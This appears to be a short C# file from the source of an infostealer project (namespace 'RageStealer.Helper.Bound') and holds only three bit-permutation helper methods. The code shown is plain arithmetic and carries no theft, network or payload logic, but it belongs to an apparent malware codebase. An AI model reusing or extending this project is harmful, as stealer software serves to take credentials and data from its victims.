namespace RageStealer.Helper.Bound;

internal abstract class Bits
{
	internal static uint BitPermuteStep(uint x, uint m, int s)
	{
		uint num = (x ^ (x >> s)) & m;
		return num ^ (num << s) ^ x;
	}

	internal static ulong BitPermuteStep(ulong x, ulong m, int s)
	{
		ulong num = (x ^ (x >> s)) & m;
		return num ^ (num << s) ^ x;
	}

	internal static ulong BitPermuteStepSimple(ulong x, ulong m, int s)
	{
		return ((x & m) << s) | ((x >> s) & m);
	}
}
